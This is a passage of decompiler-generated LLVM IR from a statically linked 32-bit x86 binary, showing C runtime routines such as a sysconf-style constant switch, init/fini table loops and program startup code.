    i32 83, label %dec_label_pc_80515e5
    i32 84, label %dec_label_pc_80515e5
    i32 85, label %dec_label_pc_80516e4
    i32 86, label %dec_label_pc_80516e4
    i32 87, label %dec_label_pc_80516c1
    i32 88, label %dec_label_pc_8051655
    i32 89, label %dec_label_pc_805165f
    i32 90, label %dec_label_pc_80516d6
    i32 91, label %dec_label_pc_80515e5
    i32 92, label %dec_label_pc_80515e5
    i32 93, label %dec_label_pc_80515e5
    i32 94, label %dec_label_pc_80515e5
    i32 95, label %dec_label_pc_80516ba
    i32 96, label %dec_label_pc_80516e4
    i32 97, label %dec_label_pc_80516e4
    i32 98, label %dec_label_pc_80515e5
    i32 99, label %dec_label_pc_80515e5
    i32 100, label %dec_label_pc_80515e5
    i32 101, label %dec_label_pc_8051669
    i32 102, label %dec_label_pc_80516ac
    i32 103, label %dec_label_pc_80516e9
    i32 104, label %dec_label_pc_80516c1
    i32 105, label %dec_label_pc_8051673
    i32 106, label %dec_label_pc_80516cf
    i32 107, label %dec_label_pc_80516cf
    i32 108, label %dec_label_pc_80516b3
    i32 109, label %dec_label_pc_80516f0
    i32 110, label %dec_label_pc_805170c
    i32 111, label %dec_label_pc_80516ac
    i32 112, label %dec_label_pc_80516e9
    i32 113, label %dec_label_pc_805170c
    i32 114, label %dec_label_pc_805167d
    i32 115, label %dec_label_pc_8051705
    i32 116, label %dec_label_pc_80516e4
    i32 117, label %dec_label_pc_80516e4
    i32 118, label %dec_label_pc_8051687
    i32 119, label %dec_label_pc_8051691
    i32 120, label %dec_label_pc_80516fe
    i32 121, label %dec_label_pc_80516c1
    i32 122, label %dec_label_pc_80516c1
    i32 123, label %dec_label_pc_80516c1
    i32 124, label %dec_label_pc_80516c1
    i32 125, label %dec_label_pc_80515e5
    i32 126, label %dec_label_pc_80515e5
    i32 127, label %dec_label_pc_80516e4
    i32 128, label %dec_label_pc_80516e4
    i32 129, label %dec_label_pc_80515e5
    i32 130, label %dec_label_pc_80515e5
    i32 131, label %dec_label_pc_80516e4
    i32 149, label %dec_label_pc_8051698
  ]

dec_label_pc_80515e5:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80515ef:                             ; preds = %dec_label_pc_80515d0
  %v1_80515ef = call i32 @function_804fe1b(i32 ptrtoint (i32* @0 to i32))
  %v1_80515f4 = inttoptr i32 %v1_80515ef to i32*
  store i32 22, i32* %v1_80515f4, align 4
  br label %dec_label_pc_80516e4

dec_label_pc_80515ff:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051609:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051613:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_805161d:                             ; preds = %dec_label_pc_80515d0
  %v0_8051620 = call i32 @function_8051d1d()
  br label %dec_label_pc_8051625

dec_label_pc_8051625:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_805161d
  br label %dec_label_pc_8051711

dec_label_pc_805162f:                             ; preds = %dec_label_pc_80515d0
  %v0_8051632 = call i32 @function_8051db4()
  br label %dec_label_pc_8051637

dec_label_pc_8051637:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_805162f
  br label %dec_label_pc_8051711

dec_label_pc_8051641:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_805164b:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051655:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_805165f:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051669:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051673:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_805167d:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051687:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051691:                             ; preds = %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051698:                             ; preds = %dec_label_pc_80515d0
  %v5_805169e = call i32 @function_8051b20(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80516a6 = icmp slt i32 %v5_805169e, 0
  %v1_80516a8 = icmp eq i1 %v2_80516a6, false
  br i1 %v1_80516a8, label %dec_label_pc_80516ba, label %dec_label_pc_80516e4

dec_label_pc_80516ac:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516b3:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516ba:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_8051698
  br label %dec_label_pc_8051711

dec_label_pc_80516c1:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516c8:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516cf:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516d6:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516dd:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516e4:                             ; preds = %dec_label_pc_8051698, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515ef
  br label %dec_label_pc_8051711

dec_label_pc_80516e9:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516f0:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516f7:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_80516fe:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051705:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_805170c:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515d0, %dec_label_pc_80515d0
  br label %dec_label_pc_8051711

dec_label_pc_8051711:                             ; preds = %dec_label_pc_8051705, %dec_label_pc_80516fe, %dec_label_pc_80516f7, %dec_label_pc_80516f0, %dec_label_pc_80516e9, %dec_label_pc_80516dd, %dec_label_pc_80516d6, %dec_label_pc_80516cf, %dec_label_pc_80516c8, %dec_label_pc_80516c1, %dec_label_pc_80516b3, %dec_label_pc_80516ac, %dec_label_pc_80516ba, %dec_label_pc_8051691, %dec_label_pc_8051687, %dec_label_pc_805167d, %dec_label_pc_8051673, %dec_label_pc_8051669, %dec_label_pc_805165f, %dec_label_pc_8051655, %dec_label_pc_805164b, %dec_label_pc_8051641, %dec_label_pc_8051637, %dec_label_pc_8051625, %dec_label_pc_8051613, %dec_label_pc_8051609, %dec_label_pc_80515ff, %dec_label_pc_80515e5, %dec_label_pc_80516e4, %dec_label_pc_805170c
  %v0_8051714 = phi i32 [ 255, %dec_label_pc_8051705 ], [ 2048, %dec_label_pc_80516fe ], [ 99, %dec_label_pc_80516f7 ], [ 20, %dec_label_pc_80516f0 ], [ -128, %dec_label_pc_80516e9 ], [ 1024, %dec_label_pc_80516dd ], [ 4, %dec_label_pc_80516d6 ], [ 32, %dec_label_pc_80516cf ], [ 256, %dec_label_pc_80516c8 ], [ 2147483647, %dec_label_pc_80516c1 ], [ 16, %dec_label_pc_80516b3 ], [ 127, %dec_label_pc_80516ac ], [ 200112, %dec_label_pc_80516ba ], [ 9, %dec_label_pc_8051691 ], [ 65535, %dec_label_pc_8051687 ], [ -32768, %dec_label_pc_805167d ], [ -2147483648, %dec_label_pc_8051673 ], [ 8, %dec_label_pc_8051669 ], [ 500, %dec_label_pc_805165f ], [ 4096, %dec_label_pc_8051655 ], [ 16384, %dec_label_pc_805164b ], [ 1000, %dec_label_pc_8051641 ], [ 32768, %dec_label_pc_8051637 ], [ 6, %dec_label_pc_8051625 ], [ 65536, %dec_label_pc_8051613 ], [ 100, %dec_label_pc_8051609 ], [ 131072, %dec_label_pc_80515ff ], [ 1, %dec_label_pc_80515e5 ], [ -1, %dec_label_pc_80516e4 ], [ 32767, %dec_label_pc_805170c ]
  ret i32 %v0_8051714

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 12, 15, 17, 16, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 22, 23, 3, 4, 16, 17, 20, 21, 14, 15, 18, 19, 1, 2, 12, 13, 24, 25, 26, 27 }
  uselistorder i32 65535, { 2, 0, 1 }
  uselistorder i32 2048, { 2, 1, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 63, { 1, 0, 2 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 46, { 1, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 2, 3, 4, 5, 6, 7, 1, 0 }
  uselistorder i32 25, { 0, 2, 1, 3, 4 }
  uselistorder i32 17, { 1, 0 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 3, 0, 5, 6, 7, 8, 9, 10, 4, 2, 1 }
  uselistorder label %dec_label_pc_8051711, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80516e4, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80516ba, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051637, { 1, 0 }
  uselistorder label %dec_label_pc_8051625, { 1, 0 }
}

define i32 @function_8051715() local_unnamed_addr {
dec_label_pc_8051715:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051715 = load i32, i32* @ebx, align 4
  store i32 %v0_8051715, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), i32 0), label %dec_label_pc_8051729, label %dec_label_pc_8051736

dec_label_pc_8051729:                             ; preds = %dec_label_pc_8051715, %dec_label_pc_8051729
  %v1_80517306 = phi i32 [ %v1_8051730, %dec_label_pc_8051729 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), i32 -1), %dec_label_pc_8051715 ]
  store i32 ptrtoint (i32* @global_var_8051730.58 to i32), i32* %stack_var_-16, align 4
  %v5_8051729 = mul i32 %v1_80517306, 4
  %v6_8051729 = add i32 %v5_8051729, ptrtoint (i32* @global_var_8053924.57 to i32)
  %v7_8051729 = inttoptr i32 %v6_8051729 to i32*
  %v8_8051729 = load i32, i32* %v7_8051729, align 4
  call void @__pseudo_call(i32 %v8_8051729)
  %v0_8051730.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051730 = add i32 %v0_8051730.pre, -1
  store i32 %v1_8051730, i32* %ebx.global-to-local, align 4
  %v10_8051731 = icmp eq i32 %v0_8051730.pre, 0
  %v1_8051734 = icmp eq i1 %v10_8051731, false
  br i1 %v1_8051734, label %dec_label_pc_8051729, label %dec_label_pc_8051736

dec_label_pc_8051736:                             ; preds = %dec_label_pc_8051729, %dec_label_pc_8051715
  %v0_8051736 = load i32, i32* @global_var_8053a68.59, align 8
  %v1_805173b = icmp eq i32 %v0_8051736, 0
  br i1 %v1_805173b, label %dec_label_pc_8051741, label %dec_label_pc_805173f

dec_label_pc_805173f:                             ; preds = %dec_label_pc_8051736
  %v0_805173f = load i32, i32* %stack_var_-16, align 4
  %v1_805173f = call i32 @unknown_0(i32 %v0_805173f)
  br label %dec_label_pc_8051741

dec_label_pc_8051741:                             ; preds = %dec_label_pc_805173f, %dec_label_pc_8051736
  %v0_8051741 = load i32, i32* @global_var_8053a6c.60, align 4
  store i32 %v0_8051741, i32* @ecx, align 4
  %v1_8051747 = icmp eq i32 %v0_8051741, 0
  br i1 %v1_8051747, label %dec_label_pc_8051750, label %dec_label_pc_805174b

dec_label_pc_805174b:                             ; preds = %dec_label_pc_8051741
  %v2_805174d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805174d, i32* %ebx.global-to-local, align 4
  %v0_805174e = load i32, i32* %stack_var_-16, align 4
  %v1_805174e = call i32 @unknown_0(i32 %v0_805174e)
  br label %dec_label_pc_8051750

dec_label_pc_8051750:                             ; preds = %dec_label_pc_8051741, %dec_label_pc_805174b
  %v2_8051750 = load i32, i32* %stack_var_-16, align 4
  %v2_8051751 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051751, i32* @edx, align 4
  ret i32 %v2_8051750

; uselistorder directives
  uselistorder i32 %v1_8051730, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051750, { 1, 0 }
  uselistorder label %dec_label_pc_8051729, { 1, 0 }
}

define i32 @function_8051754(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051754:
  ret i32 0
}

define i32 @function_8051757(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051757:
  %v0_8051757 = load i32, i32* @eax, align 4
  ret i32 %v0_8051757
}

define i32 @function_8051758() local_unnamed_addr {
dec_label_pc_8051758:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8051758 = load i32, i32* @esi, align 4
  %v0_8051759 = load i32, i32* @ebx, align 4
  %v0_805175d = load i32, i32* @eax, align 4
  store i32 %v0_805175d, i32* @esi, align 4
  %v0_805175f = load i32, i32* @edx, align 4
  store i32 %v0_805175f, i32* @ebx, align 4
  %v4_8051764 = call i32 @function_804f84d(i32 %v0_805175d, i32 1, i32 %tmp6)
  %v8_805176c = icmp eq i32 %v4_8051764, -1
  %v1_805176d = icmp eq i1 %v8_805176c, false
  br i1 %v1_805176d, label %dec_label_pc_8051788, label %dec_label_pc_805176f

dec_label_pc_805176f:                             ; preds = %dec_label_pc_8051758
  %v0_8051771 = load i32, i32* @ebx, align 4
  %v6_8051777 = call i32 @function_804f9f4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805260c.61, i32 0, i32 0), i32 %v0_8051771)
  %v1_805177f = load i32, i32* @esi, align 4
  %v12_805177f = icmp eq i32 %v6_8051777, %v1_805177f
  br i1 %v12_805177f, label %dec_label_pc_8051788, label %dec_label_pc_8051783

dec_label_pc_8051783:                             ; preds = %dec_label_pc_805176f
  %v0_8051783 = call i32 @function_805118c()
  br label %dec_label_pc_8051788

dec_label_pc_8051788:                             ; preds = %dec_label_pc_805176f, %dec_label_pc_8051758, %dec_label_pc_8051783
  %v2_8051788 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051759, i32* @ebx, align 4
  store i32 %v0_8051758, i32* @esi, align 4
  ret i32 %v2_8051788

; uselistorder directives
  uselistorder i32 ()* @function_805118c, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_804f9f4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804f84d, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051788, { 2, 0, 1 }
}

define i32 @function_805178c() local_unnamed_addr {
dec_label_pc_805178c:
  %v0_805178f = load i8, i8* @global_var_8053a70.62, align 16
  %v1_805178f = icmp eq i8 %v0_805178f, 0
  %v1_8051796 = icmp eq i1 %v1_805178f, false
  br i1 %v1_8051796, label %dec_label_pc_805178c.dec_label_pc_80517c8_crit_edge, label %dec_label_pc_8051798

dec_label_pc_805178c.dec_label_pc_80517c8_crit_edge: ; preds = %dec_label_pc_805178c
  %v0_80517cb.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80517c8

dec_label_pc_8051798:                             ; preds = %dec_label_pc_805178c
  store i8 1, i8* @global_var_8053a70.62, align 16
  store i32 4096, i32* @global_var_8053a64.63, align 4
  br label %dec_label_pc_80517c8

dec_label_pc_80517c8:                             ; preds = %dec_label_pc_805178c.dec_label_pc_80517c8_crit_edge, %dec_label_pc_8051798
  %v0_80517cb = phi i32 [ %v0_80517cb.pre, %dec_label_pc_805178c.dec_label_pc_80517c8_crit_edge ], [ 0, %dec_label_pc_8051798 ]
  ret i32 %v0_80517cb

; uselistorder directives
  uselistorder i8 1, { 8, 1, 7, 0, 4, 5, 2, 3, 6 }
  uselistorder i8* @global_var_8053a70.62, { 1, 0 }
  uselistorder label %dec_label_pc_80517c8, { 1, 0 }
}

define i32 @function_80517cc(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80517cc:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_80517cc = load i32, i32* @ebp, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8053a5c.64, align 4
  store i32 %arg6, i32* @global_var_8053a6c.60, align 4
  %v2_8051803 = mul i32 %arg2, 4
  %v3_8051803 = add i32 %tmp44, %v2_8051803
  %v1_8051806 = add i32 %v3_8051803, 4
  store i32 %v1_8051806, i32* @global_var_8053a60.65, align 32
  %v3_805180e = load i32, i32* %arg3, align 4
  %v14_805180e = icmp eq i32 %v1_8051806, %v3_805180e
  %v1_8051810 = icmp eq i1 %v14_805180e, false
  %v1_8051806.v3_8051803 = select i1 %v1_8051810, i32 %v1_8051806, i32 %v3_8051803
  store i32 %v1_8051806.v3_8051803, i32* @global_var_8053a60.65, align 32
  store i32 0, i32* %stack_var_-168, align 4
  %v2_805181d = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051822 = bitcast i32* %stack_var_-136 to i8*
  %v4_8051822 = call i32 @function_804fe6c(i8* %v3_8051822, i32 0, i32 120)
  %v0_8051827 = load i32, i32* @global_var_8053a60.65, align 32
  br label %dec_label_pc_805182f

dec_label_pc_805182f:                             ; preds = %dec_label_pc_805182f, %dec_label_pc_80517cc
  %v0_805182f = phi i32 [ %v1_8051832, %dec_label_pc_805182f ], [ %v0_8051827, %dec_label_pc_80517cc ]
  %v1_805182f = inttoptr i32 %v0_805182f to i32*
  %v2_805182f = load i32, i32* %v1_805182f, align 4
  %v3_805182f = icmp eq i32 %v2_805182f, 0
  %v1_8051832 = add i32 %v0_805182f, 4
  %v1_8051835 = icmp eq i1 %v3_805182f, false
  br i1 %v1_8051835, label %dec_label_pc_805182f, label %dec_label_pc_8051856.preheader

dec_label_pc_8051856.preheader:                   ; preds = %dec_label_pc_805182f
  store i32 %v1_8051832, i32* @ebx, align 4
  %v1_805185622 = inttoptr i32 %v1_8051832 to i32*
  %v2_805185623 = load i32, i32* %v1_805185622, align 4
  %v3_805185624 = icmp eq i32 %v2_805185623, 0
  %v1_805185926 = icmp eq i1 %v3_805185624, false
  br i1 %v1_805185926, label %dec_label_pc_805183b.lr.ph, label %dec_label_pc_805185b

dec_label_pc_805183b.lr.ph:                       ; preds = %dec_label_pc_8051856.preheader
  %v3_805181b = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051846 = add i32 %v3_805181b, 32
  br label %dec_label_pc_805183b

dec_label_pc_805183b:                             ; preds = %dec_label_pc_805183b.lr.ph, %dec_label_pc_8051853
  %v1_8051846 = phi i32 [ %v2_805185623, %dec_label_pc_805183b.lr.ph ], [ %v2_8051856, %dec_label_pc_8051853 ]
  %v0_8051845 = phi i32 [ %v1_8051832, %dec_label_pc_805183b.lr.ph ], [ %v1_8051853, %dec_label_pc_8051853 ]
  %v6_8051840 = icmp ugt i32 %v1_8051846, 14
  br i1 %v6_8051840, label %dec_label_pc_8051853, label %dec_label_pc_8051842

dec_label_pc_8051842:                             ; preds = %dec_label_pc_805183b
  store i32 %v0_8051845, i32* %stack_var_-168, align 4
  %v2_8051846 = mul i32 %v1_8051846, 8
  %v4_8051846 = add i32 %v3_8051846, %v2_8051846
  %v3_805184b = inttoptr i32 %v4_8051846 to i16*
  %v4_805184b = call i32 @function_805201a(i16* %v3_805184b, i32 %v0_8051845, i32 8)
  %v0_8051853.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051853

dec_label_pc_8051853:                             ; preds = %dec_label_pc_805183b, %dec_label_pc_8051842
  %v0_8051853 = phi i32 [ %v0_8051845, %dec_label_pc_805183b ], [ %v0_8051853.pre, %dec_label_pc_8051842 ]
  %v1_8051853 = add i32 %v0_8051853, 8
  store i32 %v1_8051853, i32* @ebx, align 4
  %v1_8051856 = inttoptr i32 %v1_8051853 to i32*
  %v2_8051856 = load i32, i32* %v1_8051856, align 4
  %v3_8051856 = icmp eq i32 %v2_8051856, 0
  %v1_8051859 = icmp eq i1 %v3_8051856, false
  br i1 %v1_8051859, label %dec_label_pc_805183b, label %dec_label_pc_805185b

dec_label_pc_805185b:                             ; preds = %dec_label_pc_8051853, %dec_label_pc_8051856.preheader
  store i32 %v2_805181d, i32* @eax, align 4
  %v0_805185f = call i32 @function_80520ed()
  store i32 %v0_805185f, i32* @eax, align 4
  %v0_8051864 = call i32 @function_805178c()
  %v1_805186d = icmp eq i32 %tmp39, 0
  %v1_805186f = icmp eq i1 %v1_805186d, false
  %v1_8051871 = and i32 %tmp39, -65536
  %v2_8051871 = or i32 %v1_8051871, 4096
  %storemerge = select i1 %v1_805186f, i32 %tmp39, i32 %v2_8051871
  store i32 %storemerge, i32* @global_var_8053a64.63, align 4
  %v13_805187a = icmp eq i32 %tmp38, -1
  %v1_805187f = icmp eq i1 %v13_805187a, false
  br i1 %v1_805187f, label %dec_label_pc_80518aa, label %dec_label_pc_8051881

dec_label_pc_8051881:                             ; preds = %dec_label_pc_805185b
  %v0_8051881 = call i32 @function_8051df9()
  store i32 %v0_8051881, i32* @ebx, align 4
  %v0_8051888 = call i32 @function_8051d68()
  %v0_805188d = load i32, i32* @ebx, align 4
  %v12_805188d = icmp eq i32 %v0_805188d, %v0_8051888
  %v1_805188f = icmp eq i1 %v12_805188d, false
  br i1 %v1_805188f, label %dec_label_pc_80518c0, label %dec_label_pc_8051891

dec_label_pc_8051891:                             ; preds = %dec_label_pc_8051881
  %v0_8051891 = call i32 @function_8051d8e()
  store i32 %v0_8051891, i32* @ebx, align 4
  %v0_8051898 = call i32 @function_8051d42()
  %v0_805189d = load i32, i32* @ebx, align 4
  %v12_805189d = icmp eq i32 %v0_805189d, %v0_8051898
  %v1_805189f = icmp eq i1 %v12_805189d, false
  br i1 %v1_805189f, label %dec_label_pc_80518c0, label %dec_label_pc_80518ea

dec_label_pc_80518aa:                             ; preds = %dec_label_pc_805185b
  br label %dec_label_pc_80518c0

dec_label_pc_80518c0:                             ; preds = %dec_label_pc_80518aa, %dec_label_pc_8051891, %dec_label_pc_8051881
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80518c7 = call i32 @function_8051758()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80518d6 = call i32 @function_8051758()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80518e5 = call i32 @function_8051758()
  br label %dec_label_pc_80518ea

dec_label_pc_80518ea:                             ; preds = %dec_label_pc_8051891, %dec_label_pc_80518c0
  store i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32* %esi.global-to-local, align 4
  %v0_80518ef = load i32, i32* @edi, align 4
  %v1_80518ef = inttoptr i32 %v0_80518ef to i32*
  %v2_80518ef = load i32, i32* %v1_80518ef, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32* %esi.global-to-local, align 4
  store i32 %v2_80518ef, i32* inttoptr (i32 134560164 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8053a68.59, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560033), i32 7), label %dec_label_pc_805191b, label %dec_label_pc_805190f

dec_label_pc_805190f:                             ; preds = %dec_label_pc_80518ea, %dec_label_pc_805190f
  %v4_805190f = phi i32 [ %v1_8051916, %dec_label_pc_805190f ], [ 0, %dec_label_pc_80518ea ]
  %v5_805190f = mul i32 %v4_805190f, 4
  %v6_805190f = add i32 %v5_805190f, ptrtoint (i32* @global_var_8053924.57 to i32)
  %v7_805190f = inttoptr i32 %v6_805190f to i32*
  %v8_805190f = load i32, i32* %v7_805190f, align 4
  call void @__pseudo_call(i32 %v8_805190f)
  %v0_8051916 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051916 = add i32 %v0_8051916, 1
  store i32 %v1_8051916, i32* %ebx.global-to-local, align 4
  %v1_8051917 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051917 = icmp ult i32 %v1_8051916, %v1_8051917
  br i1 %v7_8051917, label %dec_label_pc_805190f, label %dec_label_pc_805191b

dec_label_pc_805191b:                             ; preds = %dec_label_pc_805190f, %dec_label_pc_80518ea
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), i32* %esi.global-to-local, align 4
